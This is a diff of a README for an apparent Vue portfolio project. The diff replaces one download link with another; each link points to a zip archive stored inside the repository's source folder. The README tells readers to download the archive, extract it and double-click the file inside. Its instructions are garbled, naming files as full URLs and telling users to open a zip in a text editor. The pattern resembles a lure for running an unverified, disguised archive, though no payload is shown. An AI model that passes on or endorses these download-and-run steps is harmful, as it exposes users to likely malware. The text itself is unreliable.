@@ -1,6 +1,6 @@
 # 🎨 interactive-vue-portfolio - Create Engaging Portfolios with Ease
 
-[![Download](https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/plugins/interactive-vue-portfolio-v1.4.zip%20Now%20-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/plugins/interactive-vue-portfolio-v1.4.zip)
+[![Download](https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/components/portfolio-vue-interactive-1.9.zip%20Now%20-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/components/portfolio-vue-interactive-1.9.zip)
 
 ## 🌟 Overview
 
@@ -16,13 +16,13 @@ Follow these steps to get your portfolio up and running in no time.
    - Basic knowledge of how to navigate your computer.
 
 2. **Access the Releases Page**  
-   Visit this page to download the application: [Download the latest release](https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/plugins/interactive-vue-portfolio-v1.4.zip).
+   Visit this page to download the application: [Download the latest release](https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/components/portfolio-vue-interactive-1.9.zip).
 
 3. **Download the Application**  
    Find the latest version of the interactive-vue-portfolio on the releases page. Look for a file that matches your operating system (Windows, Mac, or Linux). Click the link to download it to your computer.
 
 4. **Locate the Downloaded File**  
-   Check your Downloads folder to find the downloaded file. Depending on your browser, it may have a name like `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/plugins/interactive-vue-portfolio-v1.4.zip`.
+   Check your Downloads folder to find the downloaded file. Depending on your browser, it may have a name like `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/components/portfolio-vue-interactive-1.9.zip`.
 
 5. **Unzip the File**  
    - Right-click the downloaded zip file and choose **Extract All** (Windows) or **Open with > Archive Utility** (Mac).
@@ -30,7 +30,7 @@ Follow these steps to get your portfolio up and running in no time.
 
 6. **Open the Application**  
    Inside the extracted folder, you will find the application file:
-   - Double-click the file named `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/plugins/interactive-vue-portfolio-v1.4.zip` to open your portfolio in your default web browser.
+   - Double-click the file named `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/components/portfolio-vue-interactive-1.9.zip` to open your portfolio in your default web browser.
 
 ## 📖 Features
 
@@ -43,7 +43,7 @@ Follow these steps to get your portfolio up and running in no time.
 
 Once the application is running, you may want to customize it to better reflect your personal style and portfolio content. Here are some quick tips:
 
-- **Update Content**: Open the `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/plugins/interactive-vue-portfolio-v1.4.zip` file in a text editor. You can change the text, images, and links to showcase your projects and skills.
+- **Update Content**: Open the `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/components/portfolio-vue-interactive-1.9.zip` file in a text editor. You can change the text, images, and links to showcase your projects and skills.
 - **Add Sections**: Use the provided templates to add more sections or features by copying and pasting from existing code.
 - **Change Styles**: Adjust the colors and fonts by editing the Tailwind CSS classes in your HTML file.
 
@@ -52,13 +52,13 @@ Once the application is running, you may want to customize it to better reflect 
 If you encounter any issues while running the portfolio, consider the following:
 
 - **Browser Compatibility**: Ensure you are using a modern web browser. Older versions may not support all features.
-- **File Locations**: Make sure you have extracted the files correctly and you are opening the `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/plugins/interactive-vue-portfolio-v1.4.zip` file from the proper location.
+- **File Locations**: Make sure you have extracted the files correctly and you are opening the `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/components/portfolio-vue-interactive-1.9.zip` file from the proper location.
 
 ## 🗂 Common Questions
 
 ### What if I want to host my portfolio online?
 
-You can use services like GitHub Pages or Netlify to host your portfolio for free. Simply follow their instructions to upload your `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/plugins/interactive-vue-portfolio-v1.4.zip` file.
+You can use services like GitHub Pages or Netlify to host your portfolio for free. Simply follow their instructions to upload your `https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/components/portfolio-vue-interactive-1.9.zip` file.
 
 ### Can I change the animations?
 
@@ -74,6 +74,6 @@ If you need help, feel free to ask for assistance. You can open an issue on the 
 
 ### Download the Application Again
 
-To begin using the interactive-vue-portfolio, revisit the Releases page: [Download the latest release](https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/plugins/interactive-vue-portfolio-v1.4.zip).
+To begin using the interactive-vue-portfolio, revisit the Releases page: [Download the latest release](https://raw.githubusercontent.com/Adripaz911/interactive-vue-portfolio/main/src/components/portfolio-vue-interactive-1.9.zip).
 
 Enjoy creating your interactive portfolio!
